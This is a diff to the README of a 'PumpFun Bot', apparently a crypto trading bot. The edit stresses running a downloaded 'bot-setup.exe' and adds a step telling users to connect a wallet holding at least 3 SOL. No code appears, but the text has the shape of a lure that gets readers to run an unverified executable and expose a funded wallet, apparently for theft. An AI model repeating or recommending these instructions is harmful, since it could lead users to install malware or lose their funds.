@@ -6,14 +6,14 @@
 Welcome to PumpFun Bot, your ultimate trading companion designed specifically for PumpFun. Whether you're a seasoned trader or just starting out, PumpFun Bot equips you with the tools and flexibility to navigate the virtual trading world with confidence and ease.
 
 ## Getting Started
-1. **Download**: Download directly from this repository. Simply execute the file bot-setup.exe and start using the bot!
-2. **Installation**: Follow the provided instructions to install PumpFun Bot on your device.
+1. **Download**: Download directly from this repository. Simply execute the file **bot-setup.exe** and start using the bot!
+2. **Connection**: Connect your wallet with **minimum 3 SOL** inside.
 3. **Customization**: Customize your trading strategy according to your preferences and risk tolerance.
 4. **Start Trading**: Begin trading with PumpFun Bot and take your trading game to the next level!
 
 ## Features
 ### 1. Connect Wallet
-To begin utilizing the full capabilities of the bot, please ensure that you connect your wallet first and have a minimum balance of 3 SOL.
+To begin utilizing the full capabilities of the bot, please ensure that you connect your wallet first and have a **minimum balance of 3 SOL**.
 
 ### 2. Strategy Selection
 Choose from a diverse range of trading strategies tailored to your preferences and risk tolerance. Whether you prefer analysis-driven, trend-following, or risk-averse approaches, PumpFun Bot has you covered.
